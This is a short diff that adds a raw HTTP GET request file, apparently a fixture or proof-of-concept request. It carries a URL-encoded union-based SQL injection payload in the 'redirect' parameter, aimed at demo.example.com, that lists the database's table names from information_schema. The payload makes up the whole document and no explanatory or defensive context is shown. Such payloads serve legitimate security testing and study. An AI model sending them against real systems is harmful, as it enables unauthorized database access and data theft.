@@ -1,0 +1,4 @@
+GET /a?redirect=1%2Bunion%2Bselect%2Btable_name%2Bfrom%2Binformation_schema.tables--%2B- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
